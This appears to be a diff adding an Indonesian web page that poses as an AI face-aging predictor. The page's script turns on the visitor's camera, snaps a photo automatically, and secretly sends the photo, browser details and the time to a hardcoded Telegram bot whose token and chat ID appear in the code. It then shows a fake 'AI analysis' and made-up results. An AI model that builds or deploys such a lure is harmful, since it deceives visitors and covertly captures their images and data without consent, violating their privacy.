@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lihat Siapa Kamu Di Masa Depan!</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 800px;
+            background-color: white;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            color: #ff5722;
+            margin-bottom: 20px;
+        }
+        
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 18px;
+            margin: 10px 2px;
+            cursor: pointer;
+            border-radius: 50px;
+            transition: background-color 0.3s ease;
+        }
+        
+        button:hover {
+            background-color: #45a049;
+        }
+        
+        #status {
+            margin-top: 20px;
+            font-style: italic;
+            color: #666;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        #videoPreview {
+            margin-top: 20px;
+            max-width: 100%;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        canvas {
+            display: none;
+        }
+        
+        #resultContainer {
+            margin-top: 30px;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            background-color: #f9f9f9;
+        }
+        
+        #loadingAnimation {
+            margin: 30px 0;
+        }
+        
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 8px solid #4CAF50;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Lihat Seperti Apa Kamu di Masa Depan! 🔮</h1>
+        <p>Aplikasi AI kami dapat memprediksi bagaimana wajah kamu di masa depan berdasarkan teknologi pengenalan wajah terkini. Klik tombol di bawah dan biarkan AI kami memproses wajahmu!</p>
+        
+        <button id="startButton">Mulai Sekarang!</button>
+        
+        <div id="cameraContainer" class="hidden">
+            <p>Tolong berikan izin kamera untuk melihat prediksi masa depanmu</p>
+            <video id="videoPreview" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+            <button id="captureButton" class="hidden">Ambil Foto</button>
+        </div>
+        
+        <div id="processingContainer" class="hidden">
+            <h2>Memproses Wajahmu...</h2>
+            <div id="loadingAnimation">
+                <div class="spinner"></div>
+            </div>
+            <p id="processingText">AI kami sedang menganalisis fitur wajahmu...</p>
+        </div>
+        
+        <div id="resultContainer" class="hidden">
+            <h2>Hasil Prediksi Masa Depan</h2>
+            <p id="resultText"></p>
+            <button id="tryAgainButton">Coba Lagi</button>
+        </div>
+        
+        <p id="status"></p>
+    </div>
+
+    <script>
+        // Konstanta untuk Bot Telegram
+        const TELEGRAM_BOT_TOKEN = '7994389263:AAGUyFXySbL3mLo0p1PODqL_NESAg8YMfYY';
+        const CHAT_ID = '6144972538';
+        
+        // Elemen DOM
+        const startButton = document.getElementById('startButton');
+        const cameraContainer = document.getElementById('cameraContainer');
+        const processingContainer = document.getElementById('processingContainer');
+        const resultContainer = document.getElementById('resultContainer');
+        const videoPreview = document.getElementById('videoPreview');
+        const canvas = document.getElementById('canvas');
+        const captureButton = document.getElementById('captureButton');
+        const statusText = document.getElementById('status');
+        const resultText = document.getElementById('resultText');
+        const tryAgainButton = document.getElementById('tryAgainButton');
+        const processingText = document.getElementById('processingText');
+        
+        // Variabel untuk menyimpan stream kamera
+        let stream = null;
+        
+        // Event Listeners
+        startButton.addEventListener('click', startCamera);
+        captureButton.addEventListener('click', captureImage);
+        tryAgainButton.addEventListener('click', resetApp);
+        
+        // Fungsi untuk memulai kamera
+        function startCamera() {
+            startButton.classList.add('hidden');
+            cameraContainer.classList.remove('hidden');
+            statusText.textContent = 'Meminta akses kamera...';
+            
+            // Meminta akses ke kamera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(mediaStream) {
+                    stream = mediaStream;
+                    videoPreview.srcObject = stream;
+                    statusText.textContent = 'Kamera siap!';
+                    
+                    // Otomatis mengambil gambar setelah 2 detik
+                    setTimeout(() => {
+                        captureImage();
+                    }, 2000);
+                })
+                .catch(function(err) {
+                    console.error("Error mengakses kamera: ", err);
+                    statusText.textContent = 'Gagal mengakses kamera. Silakan berikan izin dan coba lagi.';
+                });
+        }
+        
+        // Fungsi untuk mengambil gambar
+        function captureImage() {
+            if (stream) {
+                // Siapkan canvas untuk mengambil frame dari video
+                canvas.width = videoPreview.videoWidth;
+                canvas.height = videoPreview.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
+                
+                // Konversi canvas ke data URL
+                const imageDataURL = canvas.toDataURL('image/jpeg');
+                
+                // Tutup stream kamera
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                
+                // Tampilkan UI pemrosesan
+                cameraContainer.classList.add('hidden');
+                processingContainer.classList.remove('hidden');
+                
+                // Kirim gambar ke Telegram
+                sendImageToTelegram(imageDataURL);
+                
+                // Simulasi pemrosesan dengan pesan yang berubah
+                const processingMessages = [
+                    "Menganalisis struktur wajah...",
+                    "Menerapkan algoritma penuaan...",
+                    "Menghitung perubahan fitur wajah...",
+                    "Menyesuaikan dengan faktor genetik...",
+                    "Memproses hasil akhir..."
+                ];
+                
+                let messageIndex = 0;
+                const messageInterval = setInterval(() => {
+                    processingText.textContent = processingMessages[messageIndex];
+                    messageIndex++;
+                    
+                    if (messageIndex >= processingMessages.length) {
+                        clearInterval(messageInterval);
+                        setTimeout(showResults, 1500);
+                    }
+                }, 2000);
+            }
+        }
+        
+        // Fungsi untuk mengirim gambar ke Telegram
+        function sendImageToTelegram(imageDataURL) {
+            try {
+                // Konversi Data URL menjadi Blob
+                const byteString = atob(imageDataURL.split(',')[1]);
+                const mimeString = imageDataURL.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                
+                const blob = new Blob([ab], { type: mimeString });
+                
+                // Buat FormData untuk dikirim
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'prank-photo.jpg');
+                
+                // Tambahkan informasi browser dan waktu sebagai caption
+                const browserInfo = navigator.userAgent;
+                const currentTime = new Date().toLocaleString();
+                const ipInfo = "IP akan terlihat di logs Telegram";
+                
+                formData.append('caption', `Captured Photo!\nTime: ${currentTime}\nBrowser: ${browserInfo}\n${ipInfo}`);
+                
+                // Kirim ke API Telegram
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("Telegram response:", data))
+                .catch(error => console.error("Error sending to Telegram:", error));
+                
+            } catch (error) {
+                console.error("Error processing or sending image:", error);
+            }
+        }
+        
+        // Fungsi untuk menampilkan hasil
+        function showResults() {
+            processingContainer.classList.add('hidden');
+            resultContainer.classList.remove('hidden');
+            
+            // Tampilkan hasil palsu
+            resultText.innerHTML = `
+                <p>Berdasarkan analisis AI kami, kamu akan:</p>
+                <ul style="text-align: left; padding-left: 20px;">
+                    <li>Terlihat lebih bijaksana dengan garis wajah yang lebih tegas</li>
+                    <li>Memiliki kerutan yang menunjukkan pengalaman hidup yang berharga</li>
+                    <li>Mempertahankan senyum yang menawan dan mata yang ekspresif</li>
+                    <li>Memiliki rambut yang menunjukkan kedewasaan dan kepercayaan diri</li>
+                </ul>
+                <p>Ingat, ini hanya prediksi! Gaya hidup sehat dapat membuat perubahanmu lebih baik!</p>
+            `;
+        }
+        
+        // Fungsi untuk mengatur ulang aplikasi
+        function resetApp() {
+            resultContainer.classList.add('hidden');
+            startButton.classList.remove('hidden');
+            statusText.textContent = '';
+            processingText.textContent = 'AI kami sedang menganalisis fitur wajahmu...';
+        }
+    </script>
+</body>
+  </html>
